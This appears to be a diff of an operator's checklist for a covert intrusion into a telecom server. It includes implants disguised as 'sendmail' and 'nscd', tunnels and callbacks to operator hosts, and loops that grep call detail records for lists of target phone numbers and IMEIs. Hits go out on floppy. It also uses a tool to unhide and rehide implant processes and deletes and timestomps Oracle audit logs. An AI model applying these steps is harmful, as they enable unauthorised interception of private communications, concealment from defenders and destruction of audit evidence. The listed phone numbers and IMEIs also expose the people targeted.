+	./lvmkd -p ./nfskd -z "ls -1t /share/a1338/ne_q3ic/nb/convert/output/050501*dF*" >>T:/current/down/cdrhits.chain
+	-rm nfskd
+	
+	
+
+################################################################################
+
+
+	#### 6. Put up the CDR parser tool
+	
+	
+	
+	### if this is a short op, skip to Section 8 now.
+	
+	
+	
+	#### 6.a  For extended duration ops, Create nifty scripts in /current/bin that help with notification:
+	
+	### create a 'dots' script in /current/bin
+	#[12:26:17 FLIP /current/down]# cat ../bin/dots
+	
+	#!/bin/sh
+	exec 1>&2
+	I=5
+	[ "$1" ] && I=$1
+	for (( i=$I ; i >= 0 ; i-- )) ; do
+  	echo -en "  $i    $2 $3 $4 $5 $6  \r"
+  	sleep 1
+	done
+	
+	
+	
+	
+	### create a 'beeps' script in /current/bin
+	#[14:06:35 FLIP /current/down]# cat ../bin/beeps
+	
+	#!/bin/sh
+	I=5
+	[ "$1" ] && [ $I -gt 0 ] && I=$1
+	for ((i=1 ; i<=$I ; i++)) ; do
+  	echo -en "\a"
+  	usleep 200000
+  	echo -en "\a"
+  	usleep 200000
+  	usleep 300000
+	done
+	
+	
+		#### Old way:
+		#### Run this in a small local window: Alarm for restarting listeners every 4.5 hours:
+		#### dots 16200 until restart listeners ; beeps 88888
+	
+		### 20040807: 6am shift
+		### CHANGES:
+		# added /current/bin/dots instead of sleep (did dots at first, now a countdown).
+		# changed gs.cdrloop to -put cdp and -rm cdp before and after the rest is done.
+		# changed -beep to -beep 4.
+	
+	
+	### in a LOCAL window, run this  (during extended ops only).  This will beep when you get a hit:
+	
+	while [ 1 ] ; do clear ; ls -alrt cdrpretty*|tail -5 ;  [ -s cdrpretty ] && break ; dots 8; done ; while [ 1 ] ; do clear ; more cdrpretty |cat ; echo -en "\a" ; sleep 2 ; done
+	sleep 90m ; for ((i=1;i<300;i++)) ; do echo -en "\a" ; usleep 200000 ; done
+	
+	
+	
+	
+	
+	###     Do this section for extended ops.
+	#### 7. Run the cdrloop script every x mins (using 5 here)
+	#### NOTE: Make sure the date -d "x mins ago" in /current/etc/gs.cdrloop
+	####       matches the number of mins used for holdwindow
+	#### NOTE2: Just run "-gs cdrloop PHONENUM" to parse once without waiting
+	#### NOTE3:  PHONENUM is just the last 7 digits of the number they give you;  verify the list is accurate 
+	
+	# -holdwindow 5 -gs cdrloop PHONENUM [PHONENUM...]
+	# -holdwindow 5 -gs cdrloop 4749693 2729811 4618511 2293473 5503501 5989018 5998901 5529352 9152367 5942379 4649643 4749694 6330687 4101748 2118613 4674902 4132633 4120784 6953511 9499141 4234749 5061901 474964
+ 	-gs cdrloop 2529327 2316062 5925521 3825903 5763725 9113709
+ 	-holdwindow 5 -gs cdrloop 2529327 2316062 5925521 3825903 5763725 9113709
+	
+	
+	
+	### IF op goes past 4 or 5 hours, start a new NOPEN on the HP box and reconnect to it:
+	
+	PATH=. nscd
+	-nstun 10.211.4.2:32755
+	
+	# or
+	-nstun 10.211.4.2:32754
+	
+	
+	
+		##### OLD WAY (when we had a memory leak) don't need this - we hope)
+		##### PASTE BEGIN HERE FOR WINDOW ONE
+	
+		#-lsh dots 285 one of three
+		#-gs cdrloop 4749693 2729811 4618511 2293473 5503501 5989018 5998901 5529352 9152367 5942379 4649643 4749694 6330687 4101748 2118613 4674902 4132633 4120784 6953511 9499141 4234749 5061901 4749643
+		#-beep
+	
+		#-lsh dots 300 two of three
+		#-gs cdrloop 4749693 2729811 4618511 2293473 5503501 5989018 5998901 5529352 9152367 5942379 4649643 4749694 6330687 4101748 2118613 4674902 4132633 4120784 6953511 9499141 4234749 5061901 4749643
+		#-beep
+	
+		#-lsh dots 300 two of three
+		#-gs cdrloop 4749693 2729811 4618511 2293473 5503501 5989018 5998901 5529352 9152367 5942379 4649643 4749694 6330687 4101748 2118613 4674902 4132633 4120784 6953511 9499141 4234749 5061901 4749643
+		#-beep 10
+	
+	
+		#-exit
+		#-exit
+	
+	
+		#### RECONNECT TOP WINDOW:
+	
+		#noclient 192.168.254.253:27890
+		#w
+		#-nstun 10.211.4.1:32754
+		#w
+		#-beep 4
+	
+	
+	
+		#### RECONNECT BOTTOM WINDOW:
+	
+		#noclient 192.168.254.253:27892
+		#w
+		#-nstun 10.211.4.1:32754
+		#w
+		#-beep 4
+	
+	
+	
+	
+		#### OLD NOPEN (with memory leak)
+		#### start new servers before 5 hours have passed:
+	
+		## on alien
+		-put /current/up/morerats/noserver-3.0.2-sparc.sun.solaris-2.5.1 sendmail
+		D=-l28890 PATH=. sendmail
+		-rm sendmail
+		# burn old sendmail pid
+	
+		## on hp
+		PATH=. nscd
+		# kill old nscd
+	
+	
+	
+	#### 8. If you need to grep through old files, cdp only takes one file at a
+	####    time as input, use a script similar to this
+	
+	#### First modify the local copy of /current/etc/gs.cdrloop and comment out the -put and -rm of cdp
+	#### Run the script manually as below, then edit the gs script  to do the -put/-rm again
+	
+	-lt /share/a1338/ne_q3ic/nb/convert/output/*dF*
+	
+	# this may be big:
+	#-lt /share/a1338/ne_q3ic/nb/convert/backup/0504*dF*
+	
+	
+	### choose something similar to below:
+	
+	# Ex.:   for i in /share/a1338/ne_q3ic/nb/convert/output/04080[56]*dF* ; do echo entries from $i; ./lvmkd $i | egrep "(4749693|2729811|4618511|2293473|5503501|5989018|5998901|5529352|9152367|5942379|4649643|4749694|6330687|4101748|2118613|4674902|4132633|4120784|6953511|9499141|4234749|5061901|4749643)"; done >> T:/current/down/pasttwodays
+	
+	# Ex.:   for i in /share/a1338/ne_q3ic/nb/convert/output/*dF* ; do echo entries from $i; ./lvmkd $i | egrep "(4837951|5928813|9480166|5908884|5864304|5040368)"; done >> T:/current/down/cdrs-1025-1029
+	
+	for i in /share/a1338/ne_q3ic/nb/convert/output/0411*dF* ; do echo entries from $i; ./lvmkd $i | egrep "(29327|2316062|5925521|3825903|5763725|9113709)"; done >> T:/current/down/cdrs-1101-1105
+	
+	#-put /current/up/e10cdrparse.v3.HP-UXB.11.00 lvmkd
+	
+	for i in /share/a1338/ne_q3ic/nb/convert/output/050430*dF* ; do echo entries from $i; ./lvmkd $i | egrep "(35377400830022|35339200076038|35081689723220)"; done >> T:/current/down/cdr.imei.2Jun2005.txt
+	
+	/mnt/zip/cdrprint -a /current/down/argfiles/arfile4.txt -f /current/down/cdr.imei.2Jun2005.txt > /current/down/cdrpretty4G.2Jun05.txt
+	
+	
+	#### Put all of your numbers (the ones you are grepping for) in a file (ARGSFILE), space delimited, 
+	#### on multiple lines if needed
+	#### To pretty print:
+	# Ex: /current/bin/cdrprint -a ARGSFILE -f /current/down/cdrs-1025-1029 > cdrpretty
+	
+	/current/bin/cdrprint -a ARGSFILE -f OUTPUT_FROM_PARSER > cdrpretty
+	
+	
+	
+	
+	#### 8.5:  OPTIONAL:  This will wake us up if we get a hit (run in a local window):
+	
+	while [ 1 ] ; do clear ; ls -alrt cdrpretty*|tail -5 ;  [ -s cdrpretty ] && break ; sleep 2; done ; while [ 1 ] ; do clear ; more cdrpretty |cat ; echo -en "\a" ; sleep 2 ; done
+	
+	### OR:
+	while [ 1 ] ; do clear ;  ls -alrt cdrpretty*|tail -5 ;  [ -s cdrpretty ] &&
+	break ; cat `ls -arlt cdrpretty*|grep -v " 0 " | tail -1 | awk '{print $9}'` ;
+	dots 4; done ; while [ 1 ] ; do clear ; more cdrpretty |cat ; echo -en "\a" ;
+	sleep 2 ; done
+	
+	### OR:
+	while [ 1 ] ; do clear ; ls -alrt cdrpretty*|tail -5 ;  [ -s cdrpretty ] && break ; dots 30; done ; while [ 1 ] ; do clear ; more cdrpretty |cat ; echo -en "\a" ; sleep 2 ; done
+	
+	### OR:
+	while [ 1 ] ; do clear ;  ls -alrt cdrpretty*|tail -5 ;  [ -s cdrpretty ] &&
+	break ; cat `ls -arlt cdrpretty*|grep -v " 0 " | tail -1 | awk '{print $9}'` ;
+	dots 4; done ; clear;cat cdrpretty ;beeps 44444
+	
+	
+	
+	
+	
+	
+#### 9. If we get a hit, use this to get pretty printed output to a dos-formatted floppy;
+####     Then handcarry floppy to PINGOP area
+
+# Put all of your numbers (the ones you are grepping for) in a file (ARGSFILE), space delimited,
+# on multiple lines if needed
+
+# To pretty print:
+# Ex: /current/bin/cdrprint -a ARGSFILE -f /current/down/cdrs-1025-1029 > cdrpretty
+
+/current/bin/cdrprint -a ARGSFILE -f OUTPUT_FROM_PARSER > cdrpretty
+
+	# or
+
+/mnt/zip/cdrprint -a /current/down/argfile.combined -f /current/down/cdrhits.combined > /current/down/cdrpretty.combined.txt
+/mnt/zip/cdrprint -a /current/down/cdr.uniques -f /current/down/cdrhits.chain > /current/down/cdrpretty.chain.txt
+unix2dos /current/down/cdrpretty.combined.txt
+unix2dos /current/down/cdrpretty.chain.txt
+zip /current/down/cdr.20050501.zip /current/down/cdr*
+
+/current/bin/cdrprint -a ARGSFILE -f OUTPUT_FROM_PARSER > cdrpretty
+
+
+cp /current/down/cdrpretty /tmp/cdrpretty; cd /tmp; unix2dos /tmp/cdrpretty; mount /mnt/floppy; cp /tmp/cdrpretty /mnt/floppy/cdrpretty.txt; ls -la /mnt/floppy; umount /mnt/floppy; cd /current/down
+
+
+
+
+
+################################################################################
+################ Running ORACLE using HIDELITE on server-vas-i10 
+### from alien
+-irtun 10.171.2.50 45665 -ue -Y
+
+### to run the oracle scripts, you must do them outside of an INCISION window
+### therefore, you can use hidelite to unhide your nopen window
+### hidelite is keyed with the target's INCISION keys
+### you must run hidelite on a window with a parent PID of "1" so
+### do a callback to alien and run hidelite in the callback window
+
+### Hidelite
+### Create a callback window
+-nrtun NOPEN_PORT
+-call  10.140.0.40 NOPEN_PORT
+
+-put /mnt/zip/hidelite.server-vas-i10.mobilink.net.pk___10.171.2.50 /tmp/nscd
+-ls -t /platform/SUNW,SystemEngine/
+
+### To unhide your callback window:
+./nscd -u -p NOPENPID 
+
+### SHould now not be viewable
+-ls -t /platform/SUNW,SystemEngine/
+
+### Run your oracle commands in the callback window AFTER you unhide
+### When done, rehide your window
+
+### To hide again
+./nscd -h -p NOPENPID
+
+### SHould now be able to see this again
+-ls -t /platform/SUNW,SystemEngine/
+
+
+### Cleanup the logs created from the oracle scripts:
+-ls -t /opt/mnt/oracle/product/9.2.0/rdbms/audit
+-rm <NEW_FILES>
+-touch /opt/mnt/oracle/product/9.2.0/rdbms/audit/ora_1473.aud /opt/mnt/oracle/product/9.2.0/rdbms/audit
+
+
+
+#### BAIL from Alien  - WOOHOOOOOOOO!!!!!!!!!!
+
+
